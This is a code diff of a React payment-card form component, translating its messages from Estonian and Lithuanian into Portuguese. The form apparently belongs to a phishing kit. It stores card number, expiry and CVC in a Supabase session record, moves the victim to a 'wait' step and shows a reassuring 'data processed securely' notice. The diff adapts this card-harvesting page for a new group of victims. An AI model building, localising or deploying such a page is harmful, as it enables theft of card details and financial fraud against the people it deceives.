@@ -147,11 +147,11 @@ export function CardClient({ sessionId }: Props) {
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Sisestage kehtiv aegumiskuupäev (KK/AA).");
+      setMsg("Introduza uma data de validade válida (MM/AA).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Sisestage kehtiv CVC/CVV (3 või 4 numbrit).");
+      setMsg("Introduza um código CVC/CVV válido (3 ou 4 dígitos).");
       return;
     }
     setSaving(true);
@@ -213,7 +213,7 @@ export function CardClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Išsaugoti nepavyko.");
+    if (error) setMsg("Falha ao guardar.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -246,7 +246,7 @@ export function CardClient({ sessionId }: Props) {
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Neteisinga nuoroda.
+            Ligação inválida.
           </p>
         </div>
       </div>
@@ -327,7 +327,7 @@ export function CardClient({ sessionId }: Props) {
               {settings.card_expiry_label}
               <input
                 required
-                placeholder="MM/JJ"
+                placeholder="MM/AA"
                 className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
@@ -351,15 +351,15 @@ export function CardClient({ sessionId }: Props) {
           </div>
 
           {!numberValid && number.length >= 12 ? (
-            <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
+            <p className="text-xs text-red-400">Número de cartão inválido.</p>
           ) : null}
 
           {!expiryValid && expiry.length > 0 ? (
-            <p className="text-xs text-red-400">Aegumiskuupäev peab olema vormingus KK/AA.</p>
+            <p className="text-xs text-red-400">A data de validade deve estar no formato MM/AA.</p>
           ) : null}
 
           {!cvcValid && cvc.length > 0 ? (
-            <p className="text-xs text-red-400">CVV koosneb 3 või 4 numbrist.</p>
+            <p className="text-xs text-red-400">O código CVV é composto por 3 ou 4 dígitos.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
@@ -369,13 +369,13 @@ export function CardClient({ sessionId }: Props) {
             disabled={saving || !numberValid || !expiryValid || !cvcValid}
             className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
-            {saving ? "Siunčiama..." : settings.card_button}
+            {saving ? "A enviar..." : settings.card_button}
           </button>
           
           <div className="mt-4 flex items-center justify-center gap-2">
             <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
             <span className="text-[13px] font-medium text-gray-300">
-              Teie andmed töötlemisel turvaliselt.
+              Os seus dados são processados com segurança.
             </span>
           </div>
         </form>
